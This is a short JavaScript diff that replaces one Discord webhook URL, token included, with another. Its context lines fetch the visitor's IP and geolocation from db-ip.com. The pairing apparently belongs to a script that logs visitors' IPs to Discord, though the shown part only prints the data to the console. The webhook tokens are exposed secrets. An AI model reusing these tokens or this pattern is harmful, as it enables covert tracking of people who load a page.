@@ -1,4 +1,4 @@
-var webHookUrl = "https://canary.discord.com/api/webhooks/1014264540273324082/iY0VAHFj_8p7BnscshrBz06PPo69EOj_y0GXG-Hj8tA73iB66_AYf2qhazoJNDvZ6R8B";
+var webHookUrl = "https://canary.discord.com/api/webhooks/1014267266617049141/NAY8aTs3q8GJqRhsGL8RPZjtxHJBJNO74D89J0bcx_v64u-kBCcPl03BYhABwa059qy4";
 
 $.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
   console.log(JSON.stringify(data, null, 2));
